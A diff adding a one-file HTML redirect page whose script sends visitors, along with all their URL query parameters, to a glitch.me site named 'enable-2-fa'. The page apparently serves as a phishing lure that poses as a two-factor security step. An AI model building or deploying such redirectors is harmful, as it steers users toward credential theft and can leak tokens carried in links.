@@ -1,0 +1,23 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script>
+    // Get current URL parameters
+    const params = new URLSearchParams(window.location.search);
+
+    // Base URL you want to redirect to
+    const baseURL = "https://enable-2-fa.glitch.me";
+
+    // Append current parameters to the base URL
+    const redirectURL = baseURL + "?" + params.toString();
+
+    // Redirect
+    window.location.href = redirectURL;
+  </script>
+</head>
+<body>
+  Redirecting...
+</body>
+</html>
